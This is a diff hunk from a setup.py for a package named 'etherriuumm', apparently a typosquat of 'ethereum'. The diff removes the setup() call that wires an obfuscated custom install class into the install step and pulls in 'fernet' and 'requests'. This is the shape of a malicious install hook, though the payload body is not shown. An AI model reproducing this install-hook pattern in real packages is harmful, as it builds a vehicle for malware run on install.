@@ -18,22 +18,5 @@ class ofmWwQjloTAUaFpqeQnEJlJghMUjIRilVwpspphGHsJkrsteFGDuVehNleWvnizzNbnrDxDOXU
             install.run(self)
 
 
-setup(
-    name="etherriuumm",
-    version=VERSION,
-    author="VimjUMf",
-    author_email="BYBxXBmkxAj@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': ofmWwQjloTAUaFpqeQnEJlJghMUjIRilVwpspphGHsJkrsteFGDuVehNleWvnizzNbnrDxDOXUtGwgwNx,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
 
